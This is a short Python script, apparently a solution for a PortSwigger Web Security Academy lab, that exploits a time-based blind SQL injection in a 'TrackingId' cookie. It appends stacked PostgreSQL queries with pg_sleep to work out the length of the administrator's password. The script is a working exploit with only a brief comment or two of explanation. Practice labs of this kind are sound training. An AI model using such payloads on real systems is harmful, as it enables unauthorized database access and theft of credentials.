import requests

url = 'https://0ab700490448729c8044fd99002e00ca.web-security-academy.net/'



class Injection:
    def __init__(self, url):
        self.session = requests.session()
        self.url = url
        self.cookieId = self.getCookie()


    def getCookie(self): #Get value from vulnerable cookie

        self.session.get(self.url)
        return self.session.cookies.get('TrackingId')

    def getLen(self): #Get len from the MDP admin.
        for length in range(40):
            sqlPayload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password) = {length})+THEN+pg_sleep(6)+ELSE+pg_sleep(0)+END+FROM+users--"
            cookies = {'TrackingId' : self.cookieId + sqlPayload}

            page = self.session.get(url, cookies=cookies, timeout=15)
            if page.elapsed.total_seconds() > 5:
                print('Length : ', length)
                return length

def main():

    injection = Injection(url)
    injection.getLen()

if __name__ == '__main__':
    main()
